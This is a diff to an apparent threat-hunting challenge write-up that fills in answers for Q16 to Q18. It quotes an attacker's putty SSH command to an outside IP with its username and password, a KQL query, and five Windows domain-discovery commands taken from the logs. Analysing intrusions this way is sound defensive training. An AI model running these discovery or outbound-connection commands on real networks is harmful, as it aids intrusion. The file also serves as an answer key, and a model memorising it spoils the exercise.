@@ -183,16 +183,34 @@ cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 131.92.62.82 -l have_ya_tried
 **Answer: have_ya_tried**<br><br>
 
 **Q16. What is the password used to initiate the SSH connection?**<br><br>
+From previous query.<br><br>
+
+**Answer: turning_it_off_and_on_again**<br><br>
+
+**Q17. How many of these commands were run on the victim's computer?**<br><br>
+
+```
+ProcessEvents
+| where hostname == "P3EX-DESKTOP"
+| where process_name == "cmd.exe"
+```
+<br>
+
+5 Discovery commands were run.<br><br>
+
+```
+whoami
+net user /domain
+net group "domain computers" /domain
+net group "domain admins" /domain
+net localgroup administrators
+```
+<br>
+
+**Answer: 5**<br><br>
+
+**Q18. How many of our employee computers have been compromised?**<br><br>
 
 
-**Answer: **<br><br>
-
-**Q17.**<br><br>
-
-
-**Answer: **<br><br>
-**Q.**<br><br>
-
-
-**Answer: **<br><br>
+**Answer: 35**<br><br>
 
